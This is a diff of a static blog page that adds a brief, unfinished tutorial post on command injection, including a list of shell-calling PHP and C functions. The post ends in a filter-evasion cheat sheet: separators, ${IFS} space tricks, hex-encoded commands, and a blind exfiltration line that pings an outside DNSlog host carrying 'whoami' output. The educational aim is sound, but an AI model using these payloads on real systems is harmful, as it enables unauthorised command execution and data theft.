@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="shell," />
 
 
 
@@ -79,16 +79,18 @@
 
 
 
-<meta name="description" content="人生不仅仅是一场旅行">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Lurking&#39;s Blog">
-<meta property="og:url" content="http://www.lurking.link/categories/Web-Foundation/index.html">
+<meta name="description" content="Common occurrences of vulnerabilitiesIt often occurs when unsafe data is passed to a system shell. Use of VulnerabilitiesList directory Get file content Get reverse shell Testing of Command Injectionw">
+<meta name="keywords" content="shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Command Injection">
+<meta property="og:url" content="http://www.lurking.link/2018/09/25/Command-Injection/index.html">
 <meta property="og:site_name" content="Lurking&#39;s Blog">
-<meta property="og:description" content="人生不仅仅是一场旅行">
+<meta property="og:description" content="Common occurrences of vulnerabilitiesIt often occurs when unsafe data is passed to a system shell. Use of VulnerabilitiesList directory Get file content Get reverse shell Testing of Command Injectionw">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-09-24T17:19:53.968Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Lurking&#39;s Blog">
-<meta name="twitter:description" content="人生不仅仅是一场旅行">
+<meta name="twitter:title" content="Command Injection">
+<meta name="twitter:description" content="Common occurrences of vulnerabilitiesIt often occurs when unsafe data is passed to a system shell. Use of VulnerabilitiesList directory Get file content Get reverse shell Testing of Command Injectionw">
 
 
 
@@ -118,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://www.lurking.link/categories/Web-Foundation/"/>
+  <link rel="canonical" href="http://www.lurking.link/2018/09/25/Command-Injection/"/>
 
 
 
 
 
-  <title>Category: Web Foundation | Lurking's Blog</title>
+  <title>Command Injection | Lurking's Blog</title>
   
 
 
@@ -143,7 +145,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -281,55 +283,203 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Web Foundation<small>Category</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lurking.link/2018/09/25/Command-Injection/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lurking">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lurking's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/05/30/Http-Protocol/" itemprop="url">
-              
-                <span itemprop="name">Http Protocol</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">Command Injection</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-05-30T18:24:58+08:00"
-              content="2018-05-30" >
-          05-30
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T00:11:27+08:00">
+                2018-09-25
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Injection/" itemprop="url" rel="index">
+                    <span itemprop="name">Injection</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    </div>
+      
 
+      
+        <h2 id="Common-occurrences-of-vulnerabilities"><a href="#Common-occurrences-of-vulnerabilities" class="headerlink" title="Common occurrences of vulnerabilities"></a>Common occurrences of vulnerabilities</h2><p>It often occurs when unsafe data is passed to a system shell.</p>
+<h2 id="Use-of-Vulnerabilities"><a href="#Use-of-Vulnerabilities" class="headerlink" title="Use of Vulnerabilities"></a>Use of Vulnerabilities</h2><p><strong>List directory</strong></p>
+<p><strong>Get file content</strong></p>
+<p><strong>Get reverse shell</strong></p>
+<h2 id="Testing-of-Command-Injection"><a href="#Testing-of-Command-Injection" class="headerlink" title="Testing of Command Injection"></a>Testing of Command Injection</h2><p><strong>white Box Testing</strong><br>We focus particularly on the function that calls system shell. And<br>we try to add a semicolon(or ‘|’, ‘&amp;&amp;’ and so on) and another command<br>to the input parameter, then we can observe result whether the command<br>that we injected has been executed.<br><a id="more"></a></p>
+<ul>
+<li><p>C<br>system<br>exectl</p>
+</li>
+<li><p>php<br>system<br>exec<br>shell_exec<br>passthru<br>popen<br>proc_open<br>pcntl_exec</p>
+</li>
+</ul>
+<h2 id="Command-Injection-Filter-Evasion-Cheat-Sheet"><a href="#Command-Injection-Filter-Evasion-Cheat-Sheet" class="headerlink" title="Command Injection Filter Evasion Cheat Sheet"></a>Command Injection Filter Evasion Cheat Sheet</h2><p><strong>Separator</strong></p>
+<ul>
+<li>|</li>
+<li>||</li>
+<li>;</li>
+<li>&amp;</li>
+<li>&amp;&amp;</li>
+</ul>
+<p><strong>No space</strong></p>
+<ul>
+<li>cat&lt;flag</li>
+<li>cat${IFS}flag</li>
+<li>cat$IFS”flag”</li>
+<li>cat    flag(Tab)</li>
+</ul>
+<p><strong>Filter special characters</strong></p>
+<ul>
+<li>$(printf$IFS”\x77\x68\x6f\x61\x6d\x69”)</li>
+</ul>
+<p><strong>No visual output</strong></p>
+<ul>
+<li>ping `whoami`.rg1ido.ceye.io</li>
+</ul>
+<p>Use DNSlog to receive data</p>
+<h1 id="To-be-continue"><a href="#To-be-continue" class="headerlink" title="To be continue"></a>To be continue</h1>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/shell/" rel="tag"># shell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/12/Cross-site-Scripting/" rel="next" title="Cross-site Scripting">
+                <i class="fa fa-chevron-left"></i> Cross-site Scripting
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -337,6 +487,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -357,8 +511,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -422,6 +585,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-occurrences-of-vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Common occurrences of vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-of-Vulnerabilities"><span class="nav-number">2.</span> <span class="nav-text">Use of Vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Testing-of-Command-Injection"><span class="nav-number">3.</span> <span class="nav-text">Testing of Command Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-Injection-Filter-Evasion-Cheat-Sheet"><span class="nav-number">4.</span> <span class="nav-text">Command Injection Filter Evasion Cheat Sheet</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#To-be-continue"><span class="nav-number"></span> <span class="nav-text">To be continue</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -549,6 +728,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
